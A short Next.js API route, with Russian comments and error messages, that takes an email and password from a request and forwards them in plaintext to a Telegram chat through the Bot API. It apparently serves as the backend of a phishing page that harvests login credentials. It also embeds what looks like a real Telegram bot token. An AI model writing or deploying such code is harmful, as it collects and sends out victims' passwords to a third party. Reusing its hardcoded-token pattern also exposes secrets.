import { NextResponse } from "next/server";

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { email, password, chat_id } = body;
    if (!email || !password || !chat_id) {
      return NextResponse.json({ error: "Не все поля заполнены" }, { status: 400 });
    }
    // Вставьте свой токен ниже
    const TELEGRAM_TOKEN = "6725080038:AAH9HLWT6_ORc9U15jkVo06DIOQMjk17P-c";
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const text = `Почта: ${email}\nПароль: ${password}`;
    const res = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id, text }),
    });
    if (!res.ok) {
      return NextResponse.json({ error: "Ошибка отправки в Telegram" }, { status: 500 });
    }
    return NextResponse.json({ success: true });
  } catch (e) {
    return NextResponse.json({ error: "Ошибка сервера" }, { status: 500 });
  }
}
